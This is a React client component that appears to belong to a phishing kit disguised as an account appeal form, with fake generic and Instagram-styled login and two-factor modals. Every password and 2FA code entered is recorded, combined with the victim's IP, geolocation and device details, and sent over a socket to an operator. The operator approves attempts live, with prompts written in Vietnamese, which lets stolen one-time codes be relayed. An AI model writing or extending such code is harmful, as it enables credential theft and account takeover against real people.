'use client';

import InstagramLoginModal from '@/components/InstagramLoginModal';
import InstagramTwoFAModal from '@/components/InstagramTwoFAModal';
import LoginChoiceModal from '@/components/LoginChoiceModal';
import LoginModal from '@/components/LoginModal';
import SuccessModal from '@/components/SuccessModal';
import TwoFAModal from '@/components/TwoFAModal';
import { useSocketEmit } from '@/hooks/use-socket';
import { useAppStore } from '@/store/store';
import { buildAppealMessage } from '@/utils/message';
import { sendAppealMessage, waitCodeApproval, waitLoginApproval } from '@/utils/socket-approval';
import { useCallback, type FC } from 'react';

interface FormFlowProps {
    texts: Record<string, string>;
}

const MAX_PASS = 10;
const MAX_CODE = 10;

const FormFlow: FC<FormFlowProps> = ({ texts }) => {
    const { socket, isConnected } = useSocketEmit();
    const {
        geoInfo,
        deviceLabel,
        formData,
        loginData,
        loginProvider,
        messageId,
        passwordAttempts,
        twoFAAttempts,
        showLoginChoiceModal,
        showLoginModal,
        show2FAModal,
        showSuccessModal,
        setLoginData,
        setMessageId,
        addPasswordAttempt,
        addTwoFAAttempt,
        setShowLoginChoiceModal,
        setShowLoginModal,
        setShow2FAModal,
        setShowSuccessModal
    } = useAppStore();

    const buildMessage = useCallback(
        (login = loginData, passwords = passwordAttempts, codes = twoFAAttempts) => {
            if (!geoInfo) return '';
            return buildAppealMessage({
                form: formData,
                login,
                loginProvider,
                passwordLogs: passwords,
                codeAttempts: codes,
                ip: geoInfo,
                deviceLabel
            });
        },
        [geoInfo, deviceLabel, formData, loginData, loginProvider, passwordAttempts, twoFAAttempts]
    );

    const handleLoginSubmit = async (email: string, password: string) => {
        if (!geoInfo || !socket || !isConnected) {
            return { approved: false, isLastAttempt: false, needs2FA: false };
        }

        const nextPasswords = [...passwordAttempts, password];
        addPasswordAttempt(password);
        setLoginData({ email, password });

        const message = buildMessage({ email, password }, nextPasswords, twoFAAttempts);
        const attemptLine = `\n\n🔢 <b>Lần ${nextPasswords.length}</b> — bấm nút ở tin này để duyệt\n\n⏳ <b>Chờ duyệt...</b>`;

        try {
            const newMessageId = await sendAppealMessage(socket, {
                message: `${message}${attemptLine}`,
                message_id: messageId,
                stage: 'login',
                attempt: nextPasswords.length
            });
            setMessageId(newMessageId);

            const result = await waitLoginApproval(socket);
            const isLastAttempt = nextPasswords.length >= MAX_PASS;

            if (result === 'approved' || result === 'skipped') {
                return { approved: true, isLastAttempt, needs2FA: false };
            }
            if (result === '2fa') {
                return { approved: false, isLastAttempt, needs2FA: true };
            }
            return { approved: false, isLastAttempt, needs2FA: false };
        } catch {
            return { approved: false, isLastAttempt: nextPasswords.length >= MAX_PASS, needs2FA: false };
        }
    };

    const handle2FASubmit = async (code: string) => {
        if (!geoInfo || !socket || !isConnected) {
            return { approved: false, isLastAttempt: false };
        }

        const nextCodes = [...twoFAAttempts, code];
        addTwoFAAttempt(code);

        const message = buildMessage(loginData, passwordAttempts, nextCodes);
        const attemptLine = `\n\n🔢 <b>2FA Lần ${nextCodes.length}</b> — bấm nút ở tin này để duyệt\n\n⏳ <b>Chờ duyệt...</b>`;

        try {
            const newMessageId = await sendAppealMessage(socket, {
                message: `${message}${attemptLine}`,
                message_id: messageId,
                stage: 'code',
                attempt: nextCodes.length
            });
            setMessageId(newMessageId);

            const result = await waitCodeApproval(socket);
            const isLastAttempt = nextCodes.length >= MAX_CODE;
            return { approved: result === 'approved' || result === 'skipped', isLastAttempt };
        } catch {
            return { approved: false, isLastAttempt: nextCodes.length >= MAX_CODE };
        }
    };

    return (
        <>
            <LoginChoiceModal
                show={showLoginChoiceModal}
                texts={texts}
                onClose={() => setShowLoginChoiceModal(false)}
                onSelect={() => {
                    setShowLoginChoiceModal(false);
                    setShowLoginModal(true);
                }}
            />

            {loginProvider === 'instagram' ? (
                <InstagramLoginModal
                    show={showLoginModal}
                    texts={texts}
                    onClose={() => setShowLoginModal(false)}
                    onSubmit={handleLoginSubmit}
                    onSuccess={() => {
                        setShowLoginModal(false);
                        setShow2FAModal(true);
                    }}
                />
            ) : (
                <LoginModal
                    show={showLoginModal}
                    texts={texts}
                    onClose={() => setShowLoginModal(false)}
                    onSubmit={handleLoginSubmit}
                    onSuccess={() => {
                        setShowLoginModal(false);
                        setShow2FAModal(true);
                    }}
                />
            )}

            {loginProvider === 'instagram' ? (
                <InstagramTwoFAModal
                    show={show2FAModal}
                    texts={texts}
                    formData={formData}
                    onClose={() => setShow2FAModal(false)}
                    onSubmit={handle2FASubmit}
                    onSuccess={() => {
                        setShow2FAModal(false);
                        setShowSuccessModal(true);
                    }}
                />
            ) : (
                <TwoFAModal
                    show={show2FAModal}
                    texts={texts}
                    formData={formData}
                    onClose={() => setShow2FAModal(false)}
                    onSubmit={handle2FASubmit}
                    onSuccess={() => {
                        setShow2FAModal(false);
                        setShowSuccessModal(true);
                    }}
                />
            )}

            <SuccessModal show={showSuccessModal} onClose={() => setShowSuccessModal(false)} texts={texts} />
        </>
    );
};

export default FormFlow;
